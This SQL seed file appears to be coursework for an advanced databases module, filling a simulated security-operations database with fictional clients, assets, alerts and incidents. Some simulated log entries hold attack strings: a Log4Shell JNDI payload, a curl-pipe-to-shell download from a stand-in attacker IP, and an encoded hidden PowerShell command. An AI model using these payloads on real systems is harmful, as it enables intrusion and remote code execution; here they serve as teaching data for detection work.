-- =====================================================================
-- MIT 8103 Advanced Database Systems — Portfolio 1
-- Case study: CyberAce Tech Security Ltd (simulated global MSSP)
-- File:       sample_data.sql — SIMULATED operational data
-- Run AFTER:  schema.sql and import_real_data.sql  (database "cyberace_soc")
--
-- What is real and what is simulated:
--   REAL (loaded by import_real_data.sql, NOT by this file):
--     * vulnerability / vulnerability_cwe  <- CISA KEV catalog
--     * mitre_tactic / mitre_technique / technique_tactic <- MITRE ATT&CK
--   SIMULATED (this file): clients, analysts, assets, events, alerts,
--     incidents, tasks and the audit log. Real SOC client records are
--     confidential (and protected by data-protection law), so no public
--     source exists; simulation is standard practice.
--   * External attacker IPs use the IETF documentation ranges
--     (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 — RFC 5737),
--     so no real address is implicated.
--   * Large-volume REAL log data (Loghub OpenSSH) is added in Portfolio 2.
-- =====================================================================

-- Stop early if the real reference data has not been imported yet
DO $$ BEGIN
    IF (SELECT COUNT(*) FROM vulnerability) = 0 OR (SELECT COUNT(*) FROM mitre_technique) = 0 THEN
        RAISE EXCEPTION 'Real data missing: run import_real_data.sql (PSQL Tool) before sample_data.sql';
    END IF;
END $$;

-- Empty the SIMULATED tables and reset their ID counters so the script can be re-run.
-- The REAL reference tables (vulnerability, mitre_*) are deliberately NOT emptied.
TRUNCATE audit_log, remediation_task, asset_vulnerability, alert_event, alert,
         incident, security_event, asset, detection_rule, analyst, client
RESTART IDENTITY;


-- ---------------------------------------------------------------------
-- CLIENTS — two per region (Africa, Europe, Middle East)
-- ---------------------------------------------------------------------
INSERT INTO client (name, industry, region, country, sla_tier, contact_email, onboarded_date) VALUES
('Zenora Microfinance Bank',  'Banking',     'Africa',      'Nigeria',        'Gold',   'security@zenora.example',     '2025-03-01'),
('Kestrel Pay Ltd',           'Fintech',     'Africa',      'Kenya',          'Silver', 'soc@kestrelpay.example',      '2025-06-15'),
('Nordlicht Logistik GmbH',   'Logistics',   'Europe',      'Germany',        'Silver', 'it-sec@nordlicht.example',    '2025-09-10'),
('Harbourline Health Trust',  'Healthcare',  'Europe',      'United Kingdom', 'Gold',   'infosec@harbourline.example', '2026-01-20'),
('Al Waha Retail LLC',        'E-commerce',  'Middle East', 'UAE',            'Bronze', 'security@alwaha.example',     '2026-02-05'),
('Qamar Energy Services',     'Energy',      'Middle East', 'Saudi Arabia',   'Gold',   'cert@qamarenergy.example',    '2026-04-18');


-- ---------------------------------------------------------------------
-- ANALYSTS — CyberAce SOC staff (L1 triage, L2 investigation, L3 response)
-- ---------------------------------------------------------------------
INSERT INTO analyst (full_name, email, tier, shift) VALUES
('Adaeze Okafor',   'a.okafor@cyberacetech.example',   'L1', 'Day'),
('Tunde Bakare',    't.bakare@cyberacetech.example',   'L1', 'Night'),
('Fatima Bello',    'f.bello@cyberacetech.example',    'L2', 'Day'),
('Kwame Mensah',    'k.mensah@cyberacetech.example',   'L2', 'Night'),
('Sarah Whitfield', 's.whitfield@cyberacetech.example', 'L3', 'Day'),
('Omar Haddad',     'o.haddad@cyberacetech.example',   'L3', 'Night');


-- ---------------------------------------------------------------------
-- DETECTION RULES — CyberAce's own rules, each mapped to a REAL MITRE technique
-- ---------------------------------------------------------------------
INSERT INTO detection_rule (rule_name, technique_id, default_severity, log_source) VALUES
('Brute Force Login Attempts',          'T1110',     'High',     'Auth'),      -- Brute Force
('Internal Port Scan',                  'T1046',     'Medium',   'IDS'),       -- Network Service Discovery
('C2 Beacon to Known Malicious IP',     'T1071',     'Critical', 'Firewall'),  -- Application Layer Protocol
('Suspicious Command Execution',        'T1059',     'High',     'Endpoint'),  -- Command and Scripting Interpreter
('Impossible Travel Login',             'T1078',     'High',     'Auth'),      -- Valid Accounts
('Phishing Link Clicked',               'T1566',     'Medium',   'Email'),     -- Phishing
('Lateral Movement via RDP',            'T1021.001', 'High',     'Endpoint'),  -- Remote Services: Remote Desktop Protocol
('Ransomware File Encryption Pattern',  'T1486',     'Critical', 'Endpoint');  -- Data Encrypted for Impact


-- ---------------------------------------------------------------------
-- CVSS SCORES — KEV does not include CVSS, so base scores (CVSS v3.x)
-- are added from the NIST National Vulnerability Database (NVD)
-- for the real CVEs that appear on client assets below.
-- ---------------------------------------------------------------------
UPDATE vulnerability AS v
SET    cvss_score = n.score
FROM  (VALUES ('CVE-2021-44228', 10.0),   -- Log4Shell
              ('CVE-2024-3400',  10.0),   -- PAN-OS GlobalProtect
              ('CVE-2023-34362',  9.8),   -- MOVEit Transfer
              ('CVE-2019-0708',   9.8),   -- BlueKeep
              ('CVE-2014-0160',   7.5),   -- Heartbleed
              ('CVE-2024-21762',  9.8),   -- FortiOS SSL-VPN out-of-bounds write
              ('CVE-2023-20198', 10.0))   -- Cisco IOS XE Web UI
       AS n(cve_id, score)
WHERE  v.cve_id = n.cve_id;


-- ---------------------------------------------------------------------
-- ASSETS — three per client
-- ---------------------------------------------------------------------
INSERT INTO asset (client_id, hostname, ip_address, asset_type, operating_system, criticality) VALUES
(1, 'zmb-core-db01',   '10.10.1.10',  'Database',    'RHEL 9',                 'Critical'),  -- 1
(1, 'zmb-fw-edge01',   '10.10.0.1',   'Firewall',    'PAN-OS 11',              'Critical'),  -- 2
(1, 'zmb-ws-teller12', '10.10.5.112', 'Workstation', 'Windows 11',             'Medium'),    -- 3
(2, 'kp-api-gw01',     '10.20.1.5',   'Server',      'Ubuntu 22.04',           'Critical'),  -- 4
(2, 'kp-vpn01',        '10.20.0.2',   'Firewall',    'FortiOS 7.2',            'High'),      -- 5
(2, 'kp-ws-dev07',     '10.20.6.7',   'Workstation', 'macOS 14',               'Low'),       -- 6
(3, 'nl-wms-app01',    '10.30.2.20',  'Server',      'Windows Server 2019',    'High'),      -- 7
(3, 'nl-ftp01',        '10.30.2.40',  'Server',      'Windows Server 2016',    'High'),      -- 8
(3, 'nl-ws-ops03',     '10.30.7.3',   'Workstation', 'Windows 10',             'Medium'),    -- 9
(4, 'hl-ehr-db01',     '10.40.1.10',  'Database',    'RHEL 8',                 'Critical'),  -- 10
(4, 'hl-rdp-jump01',   '10.40.0.15',  'Server',      'Windows Server 2008 R2', 'High'),      -- 11
(4, 'hl-ws-nurse21',   '10.40.8.21',  'Workstation', 'Windows 11',             'Medium'),    -- 12
(5, 'aw-shop-web01',   '10.50.1.10',  'Cloud VM',    'Ubuntu 20.04',           'High'),      -- 13
(5, 'aw-pay-app01',    '10.50.1.20',  'Cloud VM',    'Ubuntu 20.04',           'Critical'),  -- 14
(5, 'aw-ws-mkt02',     '10.50.9.2',   'Workstation', 'Windows 11',             'Low'),       -- 15
(6, 'qe-scada-gw01',   '10.60.1.1',   'Router',      'Cisco IOS XE',           'Critical'),  -- 16
(6, 'qe-erp-app01',    '10.60.2.10',  'Server',      'Windows Server 2022',    'High'),      -- 17
(6, 'qe-ws-eng05',     '10.60.9.5',   'Workstation', 'Windows 11',             'Medium');    -- 18


-- ---------------------------------------------------------------------
-- ASSET VULNERABILITIES — which REAL KEV CVEs were found on which (simulated) assets
-- ---------------------------------------------------------------------
INSERT INTO asset_vulnerability (asset_id, cve_id, detected_at, patch_status) VALUES
(2,  'CVE-2024-3400',  '2026-10-20 09:00', 'Patched'),
(5,  'CVE-2024-21762', '2026-10-22 11:30', 'Unpatched'),
(8,  'CVE-2023-34362', '2026-10-15 08:45', 'Unpatched'),
(11, 'CVE-2019-0708',  '2026-10-15 10:10', 'Accepted Risk'),
(13, 'CVE-2021-44228', '2026-11-05 15:30', 'Patched'),
(13, 'CVE-2014-0160',  '2026-09-01 12:00', 'Patched'),
(14, 'CVE-2021-44228', '2026-11-05 15:30', 'Unpatched'),
(16, 'CVE-2023-20198', '2026-10-28 14:00', 'Unpatched');


-- ---------------------------------------------------------------------
-- SECURITY EVENTS — raw logs telling five attack stories plus normal activity
-- ---------------------------------------------------------------------

-- Story 1: brute-force attack on Kestrel Pay's VPN (25 failed logins, 10 seconds apart)
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message)
SELECT 5,
       TIMESTAMP '2026-11-02 02:14:00' + (n * INTERVAL '10 seconds'),
       'login_failed', '203.0.113.45', '10.20.0.2', 443, 'admin',
       'SSL-VPN login failed for user admin: invalid password'
FROM generate_series(0, 24) AS n;

-- Story 2: Log4Shell exploit on Al Waha's payment app, then command execution and C2 beaconing
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message) VALUES
(14, '2026-11-05 14:21:07', 'exploit_attempt', '192.0.2.10', '10.50.1.20', 8080, NULL,
     'HTTP GET /api/checkout User-Agent: ${jndi:ldap://192.0.2.10:1389/a}'),
(14, '2026-11-05 14:21:09', 'process_created', NULL, NULL, NULL, 'payapp',
     'java spawned child process: /bin/sh -c "curl -s http://192.0.2.10/x.sh | sh"');

INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message)
SELECT 14,
       TIMESTAMP '2026-11-05 14:25:00' + (n * INTERVAL '60 seconds'),
       'outbound_connection', '10.50.1.20', '198.51.100.77', 443, NULL,
       'Outbound TLS session to 198.51.100.77:443 (threat-intel: known C2 server)'
FROM generate_series(0, 9) AS n;

-- Story 3: phishing click at Harbourline, followed by RDP lateral movement
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message) VALUES
(12, '2026-11-07 09:56:40', 'url_clicked',  '10.40.8.21', '203.0.113.88', 443,  'n.adeyemi',
     'User clicked link in email "Urgent: Update your payroll details"'),
(11, '2026-11-07 10:09:15', 'rdp_login',    '10.40.8.21', '10.40.0.15',   3389, 'n.adeyemi',
     'Successful RDP logon (type 10) from user workstation to jump server'),
(10, '2026-11-07 10:11:02', 'rdp_login',    '10.40.0.15', '10.40.1.10',   3389, 'n.adeyemi',
     'Successful RDP logon from jump server to EHR database host');

-- Story 4: internal port scan from a Nordlicht operations workstation
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message)
SELECT 9,
       TIMESTAMP '2026-11-09 23:00:00' + (row_number() OVER () * INTERVAL '2 seconds'),
       'port_scan', '10.30.7.3', '10.30.2.40', p, NULL,
       'IDS: TCP SYN probe to port ' || p
FROM unnest(ARRAY[21,22,23,25,80,135,139,443,445,1433,3306,3389,5985,8080,8443]) AS p;

-- Story 5: encoded PowerShell on a Zenora teller workstation
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message) VALUES
(3, '2026-11-10 09:10:30', 'process_created', NULL, NULL, NULL, 'teller12',
    'powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...');

-- Other alerting activity: impossible travel, brute force on Zenora firewall, authorised vulnerability scan
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message) VALUES
(4,  '2026-11-08 16:10:00', 'login_success', '192.0.2.50',      '10.20.1.5', 22,  'j.mwangi', 'SSH login accepted (geo: Nairobi, KE)'),
(4,  '2026-11-08 16:42:00', 'login_success', '198.51.100.200',  '10.20.1.5', 22,  'j.mwangi', 'SSH login accepted (geo: Sao Paulo, BR)'),
(2,  '2026-11-10 02:58:10', 'login_failed',  '203.0.113.12',    '10.10.0.1', 443, 'root',     'GlobalProtect portal login failed'),
(2,  '2026-11-10 02:58:25', 'login_failed',  '203.0.113.12',    '10.10.0.1', 443, 'root',     'GlobalProtect portal login failed'),
(2,  '2026-11-10 02:58:41', 'login_failed',  '203.0.113.12',    '10.10.0.1', 443, 'root',     'GlobalProtect portal login failed'),
(17, '2026-11-06 10:58:00', 'port_scan',     '10.60.9.250',     '10.60.2.10', 445, NULL,      'IDS: TCP SYN probe to port 445 (source: scheduled vulnerability scanner)');

-- Normal (benign) activity — most real logs are NOT attacks
INSERT INTO security_event (asset_id, event_time, event_type, source_ip, destination_ip, destination_port, username, raw_message) VALUES
(1,  '2026-11-10 08:00:12', 'login_success', '10.10.5.20', '10.10.1.10', 5432, 'dba_ola',   'Database login accepted'),
(7,  '2026-11-09 07:30:45', 'login_success', '10.30.7.3',  '10.30.2.20', 443,  'k.schmidt', 'Web application login accepted'),
(15, '2026-11-08 12:15:00', 'url_clicked',   '10.50.9.2',  '192.0.2.200', 443, 'm.rahman',  'User visited company-approved marketing site'),
(18, '2026-11-09 13:05:33', 'login_success', '10.60.9.5',  '10.60.2.10', 3389, 'eng05',     'RDP logon from engineering workstation (approved)');


-- ---------------------------------------------------------------------
-- INCIDENTS — incidents 4 and 5 are NEW and UNASSIGNED (used in Portfolio 3)
-- ---------------------------------------------------------------------
INSERT INTO incident (client_id, assigned_analyst_id, title, severity, status, opened_at, closed_at) VALUES
(2, 4,    'Brute-force attack on VPN gateway kp-vpn01',               'High',     'Closed',      '2026-11-02 02:25', '2026-11-02 06:10'),
(5, 5,    'Log4Shell exploitation and C2 beaconing on aw-pay-app01',  'Critical', 'In Progress', '2026-11-05 14:40', NULL),
(4, 3,    'Phishing compromise leading to RDP lateral movement',      'High',     'Contained',   '2026-11-07 10:20', NULL),
(3, NULL, 'Internal port scan from operations workstation',           'Medium',   'New',         '2026-11-09 23:05', NULL),
(1, NULL, 'Encoded PowerShell execution on teller workstation',       'High',     'New',         '2026-11-10 09:15', NULL);


-- ---------------------------------------------------------------------
-- ALERTS
-- ---------------------------------------------------------------------
INSERT INTO alert (rule_id, asset_id, incident_id, triggered_at, severity, status) VALUES
(1, 5,  1,    '2026-11-02 02:16:00', 'High',     'Escalated'),       -- 1  brute force kp-vpn01
(3, 14, 2,    '2026-11-05 14:32:00', 'Critical', 'Escalated'),       -- 2  C2 beacon
(4, 14, 2,    '2026-11-05 14:21:30', 'High',     'Escalated'),       -- 3  java spawned shell
(6, 12, 3,    '2026-11-07 09:58:00', 'Medium',   'Escalated'),       -- 4  phishing click
(7, 11, 3,    '2026-11-07 10:12:00', 'High',     'Escalated'),       -- 5  RDP lateral movement
(2, 9,  4,    '2026-11-09 23:02:00', 'Medium',   'Escalated'),       -- 6  port scan
(4, 3,  5,    '2026-11-10 09:11:00', 'High',     'Escalated'),       -- 7  encoded PowerShell
(5, 4,  NULL, '2026-11-08 16:45:00', 'High',     'Investigating'),   -- 8  impossible travel
(1, 2,  NULL, '2026-11-10 03:00:00', 'High',     'Open'),            -- 9  brute force zmb-fw-edge01
(2, 17, NULL, '2026-11-06 11:00:00', 'Medium',   'False Positive');  -- 10 authorised scanner


-- ---------------------------------------------------------------------
-- ALERT_EVENT — link each alert to the events that triggered it
-- (uses queries instead of hard-coded IDs)
-- ---------------------------------------------------------------------
INSERT INTO alert_event (alert_id, event_id)
SELECT 1, event_id FROM security_event WHERE asset_id = 5  AND event_type = 'login_failed'
UNION ALL
SELECT 2, event_id FROM security_event WHERE asset_id = 14 AND event_type = 'outbound_connection'
UNION ALL
SELECT 3, event_id FROM security_event WHERE asset_id = 14 AND event_type IN ('exploit_attempt', 'process_created')
UNION ALL
SELECT 4, event_id FROM security_event WHERE asset_id = 12 AND event_type = 'url_clicked'
UNION ALL
SELECT 5, event_id FROM security_event WHERE asset_id IN (10, 11) AND event_type = 'rdp_login'
UNION ALL
SELECT 6, event_id FROM security_event WHERE asset_id = 9  AND event_type = 'port_scan'
UNION ALL
SELECT 7, event_id FROM security_event WHERE asset_id = 3  AND event_type = 'process_created'
UNION ALL
SELECT 8, event_id FROM security_event WHERE asset_id = 4  AND username = 'j.mwangi'
UNION ALL
SELECT 9, event_id FROM security_event WHERE asset_id = 2  AND event_type = 'login_failed'
UNION ALL
SELECT 10, event_id FROM security_event WHERE asset_id = 17 AND event_type = 'port_scan';


-- ---------------------------------------------------------------------
-- REMEDIATION TASKS
-- ---------------------------------------------------------------------
INSERT INTO remediation_task (incident_id, analyst_id, description, due_date, status, completed_at) VALUES
(1, 4, 'Block source IP 203.0.113.45 at the perimeter firewall',            '2026-11-02', 'Done',    '2026-11-02 02:40'),
(1, 4, 'Enforce MFA on all VPN administrator accounts',                     '2026-11-03', 'Done',    '2026-11-02 05:55'),
(2, 5, 'Isolate aw-pay-app01 from the network',                             '2026-11-05', 'Done',    '2026-11-05 15:05'),
(2, 5, 'Upgrade Log4j to a patched version on the payment application',     '2026-11-12', 'Pending', NULL),
(2, 6, 'Hunt for connections to 198.51.100.77 across all client assets',    '2026-11-13', 'Pending', NULL),
(3, 3, 'Reset credentials for the compromised user account',                '2026-11-07', 'Done',    '2026-11-07 10:45'),
(3, 3, 'Block direct RDP from user VLAN to hl-rdp-jump01',                  '2026-11-14', 'Pending', NULL);


-- ---------------------------------------------------------------------
-- AUDIT LOG — analyst actions
-- ---------------------------------------------------------------------
INSERT INTO audit_log (analyst_id, action, entity_type, entity_id, logged_at) VALUES
(2, 'ESCALATE_ALERT',  'alert',    1, '2026-11-02 02:22:00'),
(4, 'CLAIM_INCIDENT',  'incident', 1, '2026-11-02 02:26:00'),
(4, 'CLOSE_INCIDENT',  'incident', 1, '2026-11-02 06:10:00'),
(1, 'ESCALATE_ALERT',  'alert',    2, '2026-11-05 14:35:00'),
(5, 'CLAIM_INCIDENT',  'incident', 2, '2026-11-05 14:41:00'),
(1, 'ESCALATE_ALERT',  'alert',    4, '2026-11-07 10:01:00'),
(3, 'CLAIM_INCIDENT',  'incident', 3, '2026-11-07 10:21:00'),
(3, 'CONTAIN_INCIDENT','incident', 3, '2026-11-07 10:50:00'),
(1, 'CLOSE_ALERT',     'alert',   10, '2026-11-06 11:20:00'),
(2, 'ESCALATE_ALERT',  'alert',    6, '2026-11-09 23:04:00');


-- ---------------------------------------------------------------------
-- VERIFICATION — row count for every table (R = real data, S = simulated)
-- ---------------------------------------------------------------------
SELECT 'R  mitre_tactic' AS table_name, COUNT(*) AS row_count FROM mitre_tactic
UNION ALL SELECT 'R  mitre_technique',    COUNT(*) FROM mitre_technique
UNION ALL SELECT 'R  technique_tactic',   COUNT(*) FROM technique_tactic
UNION ALL SELECT 'R  vulnerability',      COUNT(*) FROM vulnerability
UNION ALL SELECT 'R  vulnerability_cwe',  COUNT(*) FROM vulnerability_cwe
UNION ALL SELECT 'S  client',             COUNT(*) FROM client
UNION ALL SELECT 'S  analyst',             COUNT(*) FROM analyst
UNION ALL SELECT 'S  detection_rule',      COUNT(*) FROM detection_rule
UNION ALL SELECT 'S  asset',               COUNT(*) FROM asset
UNION ALL SELECT 'S  asset_vulnerability', COUNT(*) FROM asset_vulnerability
UNION ALL SELECT 'S  security_event',      COUNT(*) FROM security_event
UNION ALL SELECT 'S  incident',            COUNT(*) FROM incident
UNION ALL SELECT 'S  alert',               COUNT(*) FROM alert
UNION ALL SELECT 'S  alert_event',         COUNT(*) FROM alert_event
UNION ALL SELECT 'S  remediation_task',    COUNT(*) FROM remediation_task
UNION ALL SELECT 'S  audit_log',           COUNT(*) FROM audit_log;
